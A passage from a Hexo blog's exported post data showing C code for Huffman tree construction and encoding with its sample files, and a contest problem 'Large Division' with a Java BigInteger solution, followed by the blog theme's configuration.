class=\"number\">-1</span>,i,s1,s2;</span><br><span class=\"line\">\t*ht\t=(HuffmanTree) <span class=\"built_in\">malloc</span>((m+<span class=\"number\">1</span>)*<span class=\"keyword\">sizeof</span>(HTNode));</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t(*ht)[i].weight=w[i];</span><br><span class=\"line\">\t\t(*ht)[i].LChild=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t(*ht)[i].parent=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t(*ht)[i].RChild=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=n+<span class=\"number\">1</span>;i&lt;=m;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t(*ht)[i].weight=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t(*ht)[i].LChild=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t(*ht)[i].parent=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t(*ht)[i].RChild=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tFILE *fp;</span><br><span class=\"line\">\tfp=fopen(<span class=\"string\">&quot;Code.txt&quot;</span>,<span class=\"string\">&quot;w&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">fprintf</span>(fp,<span class=\"string\">&quot;哈夫曼树为: \\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=n+<span class=\"number\">1</span>;i&lt;=m;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tSelect(ht,i<span class=\"number\">-1</span>,&amp;s1,&amp;s2);</span><br><span class=\"line\">\t\t(*ht)[s1].parent=i;</span><br><span class=\"line\">\t\t(*ht)[s2].parent=i;</span><br><span class=\"line\">\t\t(*ht)[i].LChild=s1;</span><br><span class=\"line\">\t\t(*ht)[i].RChild=s2;</span><br><span class=\"line\">\t\t(*ht)[i].weight=(*ht)[s1].weight +(*ht)[s2].weight;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(fp,<span class=\"string\">&quot;%d(%d,%d)\\n&quot;</span>,(*ht)[i].weight,(*ht)[s1].weight,(*ht)[s2].weight);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">fprintf</span>(fp,<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">\tfclose(fp);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">CrtHuffmanCode</span><span class=\"params\">(HuffmanTree *ht,HuffmanCode *hc,<span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> *cd;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a[<span class=\"number\">100</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,start,p,w=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> c;</span><br><span class=\"line\">\thc=(HuffmanCode *)<span class=\"built_in\">malloc</span>((n+<span class=\"number\">1</span>)*<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">char</span> *));</span><br><span class=\"line\">\tcd=(<span class=\"keyword\">char</span> *) <span class=\"built_in\">malloc</span>(n*<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">char</span>));</span><br><span class=\"line\">\tcd[n<span class=\"number\">-1</span>]=<span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\ta[i]=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\tstart=n - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(c=i,p=(*ht)[i].parent;p != <span class=\"number\">0</span>;c=p,p=(*ht)[p].parent)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>((*ht)[p].LChild==c)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tcd[--start]=<span class=\"string\">&#x27;0&#x27;</span>;</span><br><span class=\"line\">\t\t\t\ta[i]++;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tcd[--start]=<span class=\"string\">&#x27;1&#x27;</span>;</span><br><span class=\"line\">\t\t\t\ta[i]++;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\thc[i]=(<span class=\"keyword\">char</span> *) <span class=\"built_in\">malloc</span>((n - start)*<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">char</span>));</span><br><span class=\"line\">\t\t<span class=\"built_in\">strcpy</span>(hc[i],&amp;cd[start]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(cd);</span><br><span class=\"line\">\tFILE *fp,*sf,*rf;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> ch;</span><br><span class=\"line\">\tfp=fopen(<span class=\"string\">&quot;Code.txt&quot;</span>,<span class=\"string\">&quot;a+&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(fp,<span class=\"string\">&quot;权值为%d的字母%c的哈夫曼编码为：%s\\n&quot;</span>,(*ht)[i].weight,key[i],hc[i]);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">\t\tw+=(*ht)[i].weight*a[i];</span><br><span class=\"line\">\t<span class=\"built_in\">fprintf</span>(fp,<span class=\"string\">&quot;带权路径为：%d\\n&quot;</span>,w);</span><br><span class=\"line\">\tfclose(fp);</span><br><span class=\"line\">\tsf=fopen(<span class=\"string\">&quot;SourceFile.txt&quot;</span>,<span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">\trf=fopen(<span class=\"string\">&quot;ResultFile.txt&quot;</span>,<span class=\"string\">&quot;w&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(<span class=\"built_in\">fscanf</span>(sf,<span class=\"string\">&quot;%c&quot;</span>,&amp;ch)!=EOF)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(key[i]==ch)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">fprintf</span>(rf,<span class=\"string\">&quot;%s&quot;</span>,hc[i]);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfclose(sf);</span><br><span class=\"line\">\tfclose(rf);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tHuffmanTree\tHT;</span><br><span class=\"line\">\tHuffmanCode\tHC;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> *w,i,N=<span class=\"number\">0</span>,S[<span class=\"number\">200</span>],k=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> ch;</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(S,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(S));</span><br><span class=\"line\">\tFILE *fp;</span><br><span class=\"line\">\tfp=fopen(<span class=\"string\">&quot;SourceFile.txt&quot;</span>,<span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(<span class=\"built_in\">fscanf</span>(fp,<span class=\"string\">&quot;%c&quot;</span>,&amp;ch)!=EOF)S[ch]++;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"string\">&#x27;A&#x27;</span>;i&lt;=<span class=\"string\">&#x27;Z&#x27;</span>;i++)<span class=\"keyword\">if</span>(S[i])N++;</span><br><span class=\"line\">\tfclose(fp);</span><br><span class=\"line\">\tw=(<span class=\"keyword\">int</span> *)<span class=\"built_in\">malloc</span>((N+<span class=\"number\">1</span>)*<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>));</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"string\">&#x27;A&#x27;</span>;i&lt;=<span class=\"string\">&#x27;Z&#x27;</span>;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(S[i])</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tkey[++k]=i;</span><br><span class=\"line\">\t\t\tw[k]=S[i];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCrtHuffmanTree(&amp;HT,w,N);</span><br><span class=\"line\">\tCrtHuffmanCode(&amp;HT,&amp;HC,N);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br><br/><br><strong>SourceFile.txt</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AAAAABBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCDDDDDDDDEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFFFFFFGGGHHHHHHHHHHH</span><br></pre></td></tr></table></figure><br><br/><br><strong>Code.txt</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">哈夫曼树为: </span><br><span class=\"line\">8(3,5)</span><br><span class=\"line\">15(7,8)</span><br><span class=\"line\">19(8,11)</span><br><span class=\"line\">29(14,15)</span><br><span class=\"line\">40(19,21)</span><br><span class=\"line\">54(25,29)</span><br><span class=\"line\">94(40,54)</span><br><span class=\"line\"></span><br><span class=\"line\">权值为5的字母A的哈夫曼编码为：0001</span><br><span class=\"line\">权值为25的字母B的哈夫曼编码为：10</span><br><span class=\"line\">权值为7的字母C的哈夫曼编码为：1110</span><br><span class=\"line\">权值为8的字母D的哈夫曼编码为：1111</span><br><span class=\"line\">权值为14的字母E的哈夫曼编码为：110</span><br><span class=\"line\">权值为21的字母F的哈夫曼编码为：01</span><br><span class=\"line\">权值为3的字母G的哈夫曼编码为：0000</span><br><span class=\"line\">权值为11的字母H的哈夫曼编码为：001</span><br><span class=\"line\">带权路径为：259</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><br><br/><br><strong>ResultFile.txt</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0001000100010001000110101010101010101010101010101010101010101010101010111011101110111011101110111011111111111111111111111111111111110110110110110110110110110110110110110110010101010101010101010101010101010101010101000000000000001001001001001001001001001001001</span><br></pre></td></tr></table></figure></p>"},{"title":"Large Division","date":"2019-03-29T09:11:09.000Z","abbrlink":"e17037ac","updated":"2020-05-11T09:48:14.958Z","_content":"\n# Descript\n{% blockquote %}\nGiven two integers, a and b, you should check whether a is divisible by b or not. We know that an integer a is divisible by an integer b if and only if there exists an integer c such that a = b * c.\n{% endblockquote %}\n<!--more-->\n# Input\n{% blockquote %}\nInput starts with an integer T (≤ 525), denoting the number of test cases.\n\nEach case starts with a line containing two integers a (-10200 ≤ a ≤ 10200) and b (|b| > 0, b fits into a 32 bit signed integer). Numbers will not contain leading zeroes.\n{% endblockquote %}\n# Output\n{% blockquote %}\nFor each case, print the case number first. Then print 'divisible' if a is divisible by b. Otherwise print 'not divisible'.\n{% endblockquote %}\n# Sample Input\n```nohilight\n6\n101 101\n0 67\n-101 101\n7678123668327637674887634 101\n11010000000000000000 256\n-202202202202000202202202 -101\n```\n\n# Sample Output\n```nohilight\nCase 1: divisible\nCase 2: divisible\nCase 3: divisible\nCase 4: not divisible\nCase 5: divisible\nCase 6: divisible\n```\n# Code\n**java暴力代码**\n```java\nimport java.util.Scanner;\nimport java.math.BigInteger;\npublic class Main{\n\tpublic static void main(String[] args) {\n\t\tScanner sc=new Scanner(System.in);\n\t\tBigInteger a,b;\n\t\tInteger T = sc.nextInt(),k=1;\n\t\twhile(T-->0){\n\t\t\ta = sc.nextBigInteger();\n\t\t\tb = sc.nextBigInteger();\n\t\t\ta = a.abs();\n\t\t\tb = b.abs();\n\t\t\tSystem.out.print(\"Case \" + k++ +\": \");\n\t\t\tif(a.mod(b) == BigInteger.valueOf(0))System.out.println(\"divisible\");\n\t\t\telse System.out.println(\"not divisible\");\n\t\t}\n\t}\n}\n```\n","source":"_posts/LargeDivision.md","raw":"---\ntitle: Large Division\ndate: 2019-03-29 17:11:09\ncategories:\n  - Algorithm\ntags:\n  - 同余定理\nabbrlink: e17037ac\nupdated:\n---\n\n# Descript\n{% blockquote %}\nGiven two integers, a and b, you should check whether a is divisible by b or not. We know that an integer a is divisible by an integer b if and only if there exists an integer c such that a = b * c.\n{% endblockquote %}\n<!--more-->\n# Input\n{% blockquote %}\nInput starts with an integer T (≤ 525), denoting the number of test cases.\n\nEach case starts with a line containing two integers a (-10200 ≤ a ≤ 10200) and b (|b| > 0, b fits into a 32 bit signed integer). Numbers will not contain leading zeroes.\n{% endblockquote %}\n# Output\n{% blockquote %}\nFor each case, print the case number first. Then print 'divisible' if a is divisible by b. Otherwise print 'not divisible'.\n{% endblockquote %}\n# Sample Input\n```nohilight\n6\n101 101\n0 67\n-101 101\n7678123668327637674887634 101\n11010000000000000000 256\n-202202202202000202202202 -101\n```\n\n# Sample Output\n```nohilight\nCase 1: divisible\nCase 2: divisible\nCase 3: divisible\nCase 4: not divisible\nCase 5: divisible\nCase 6: divisible\n```\n# Code\n**java暴力代码**\n```java\nimport java.util.Scanner;\nimport java.math.BigInteger;\npublic class Main{\n\tpublic static void main(String[] args) {\n\t\tScanner sc=new Scanner(System.in);\n\t\tBigInteger a,b;\n\t\tInteger T = sc.nextInt(),k=1;\n\t\twhile(T-->0){\n\t\t\ta = sc.nextBigInteger();\n\t\t\tb = sc.nextBigInteger();\n\t\t\ta = a.abs();\n\t\t\tb = b.abs();\n\t\t\tSystem.out.print(\"Case \" + k++ +\": \");\n\t\t\tif(a.mod(b) == BigInteger.valueOf(0))System.out.println(\"divisible\");\n\t\t\telse System.out.println(\"not divisible\");\n\t\t}\n\t}\n}\n```\n","slug":"LargeDivision","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkb1001cqse5ffzmgjgy","content":"<h1 id=\"Descript\"><a href=\"#Descript\" class=\"headerlink\" title=\"Descript\"></a>Descript</h1><blockquote><p>Given two integers, a and b, you should check whether a is divisible by b or not. We know that an integer a is divisible by an integer b if and only if there exists an integer c such that a = b * c.</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"Input\"><a href=\"#Input\" class=\"headerlink\" title=\"Input\"></a>Input</h1><blockquote><p>Input starts with an integer T (≤ 525), denoting the number of test cases.</p>\n<p>Each case starts with a line containing two integers a (-10200 ≤ a ≤ 10200) and b (|b| &gt; 0, b fits into a 32 bit signed integer). Numbers will not contain leading zeroes.</p>\n</blockquote>\n<h1 id=\"Output\"><a href=\"#Output\" class=\"headerlink\" title=\"Output\"></a>Output</h1><blockquote><p>For each case, print the case number first. Then print ‘divisible’ if a is divisible by b. Otherwise print ‘not divisible’.</p>\n</blockquote>\n<h1 id=\"Sample-Input\"><a href=\"#Sample-Input\" class=\"headerlink\" title=\"Sample Input\"></a>Sample Input</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">6</span><br><span class=\"line\">101 101</span><br><span class=\"line\">0 67</span><br><span class=\"line\">-101 101</span><br><span class=\"line\">7678123668327637674887634 101</span><br><span class=\"line\">11010000000000000000 256</span><br><span class=\"line\">-202202202202000202202202 -101</span><br></pre></td></tr></table></figure>\n<h1 id=\"Sample-Output\"><a href=\"#Sample-Output\" class=\"headerlink\" title=\"Sample Output\"></a>Sample Output</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Case 1: divisible</span><br><span class=\"line\">Case 2: divisible</span><br><span class=\"line\">Case 3: divisible</span><br><span class=\"line\">Case 4: not divisible</span><br><span class=\"line\">Case 5: divisible</span><br><span class=\"line\">Case 6: divisible</span><br></pre></td></tr></table></figure>\n<h1 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h1><p><strong>java暴力代码</strong><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.Scanner;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.math.BigInteger;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Main</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">\t\tScanner sc=<span class=\"keyword\">new</span> Scanner(System.in);</span><br><span class=\"line\">\t\tBigInteger a,b;</span><br><span class=\"line\">\t\tInteger T = sc.nextInt(),k=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span>(T--&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\t\ta = sc.nextBigInteger();</span><br><span class=\"line\">\t\t\tb = sc.nextBigInteger();</span><br><span class=\"line\">\t\t\ta = a.abs();</span><br><span class=\"line\">\t\t\tb = b.abs();</span><br><span class=\"line\">\t\t\tSystem.out.print(<span class=\"string\">&quot;Case &quot;</span> + k++ +<span class=\"string\">&quot;: &quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(a.mod(b) == BigInteger.valueOf(<span class=\"number\">0</span>))System.out.println(<span class=\"string\">&quot;divisible&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> System.out.println(<span class=\"string\">&quot;not divisible&quot;</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":1208,"excerpt":"<h1 id=\"Descript\"><a href=\"#Descript\" class=\"headerlink\" title=\"Descript\"></a>Descript</h1><blockquote><p>Given two integers, a and b, you should check whether a is divisible by b or not. We know that an integer a is divisible by an integer b if and only if there exists an integer c such that a = b * c.</p>\n</blockquote>","more":"<h1 id=\"Input\"><a href=\"#Input\" class=\"headerlink\" title=\"Input\"></a>Input</h1><blockquote><p>Input starts with an integer T (≤ 525), denoting the number of test cases.</p>\n<p>Each case starts with a line containing two integers a (-10200 ≤ a ≤ 10200) and b (|b| &gt; 0, b fits into a 32 bit signed integer). Numbers will not contain leading zeroes.</p>\n</blockquote>\n<h1 id=\"Output\"><a href=\"#Output\" class=\"headerlink\" title=\"Output\"></a>Output</h1><blockquote><p>For each case, print the case number first. Then print ‘divisible’ if a is divisible by b. Otherwise print ‘not divisible’.</p>\n</blockquote>\n<h1 id=\"Sample-Input\"><a href=\"#Sample-Input\" class=\"headerlink\" title=\"Sample Input\"></a>Sample Input</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span 